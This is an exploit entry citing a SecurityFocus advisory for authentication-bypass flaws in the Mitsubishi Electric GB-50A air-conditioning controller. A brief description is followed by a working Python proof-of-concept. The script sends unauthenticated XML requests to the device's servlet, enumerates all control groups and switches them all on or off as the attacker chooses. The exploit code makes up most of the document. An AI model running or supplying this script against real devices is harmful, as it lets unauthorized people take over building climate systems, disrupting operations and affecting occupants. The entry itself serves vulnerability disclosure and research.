source: http://www.securityfocus.com/bid/28406/info

The Mitsubishi Electric GB-50A is prone to multiple authentication-bypass vulnerabilities.

Successful exploits will allow unauthorized attackers to gain access to administrative functionality and completely compromise vulnerable devices; other attacks are also possible. 

# you can get BeautifulSoup from:
# http://www.crummy.com/software/BeautifulSoup/#Download
from BeautifulSoup import BeautifulSoup
from httplib import HTTPConnection
import sys

ip = sys.argv[1]
template = '<Mnet Group="%%s" Drive="%s" />' % sys.argv[2].upper()

def post(data):
    c = HTTPConnection(ip)
    c.request('POST','/servlet/MIMEReceiveServlet',data,{'content-type':'text/xml'})
    return BeautifulSoup(c.getresponse().read())
    
# first out what groups there are
soup = post("""
<?xml version="1.0" encoding="UTF-8"?>
<Packet>
 <Command>getRequest</Command>
 <DatabaseManager>
  <ControlGroup>
   <MnetList/>
  </ControlGroup>
 </DatabaseManager>
</Packet>
""")
group_nums = [(g['group']) for g in soup.findAll('mnetrecord')]
# now go through and set all the on/off bits to what we were told
soup = post("""
<?xml version="1.0" encoding="UTF-8"?>
<Packet>
 <Command>setRequest</Command>
 <DatabaseManager>
%s
 </DatabaseManager>
</Packet>
""" % ('\n'.join([template%g for g in group_nums])))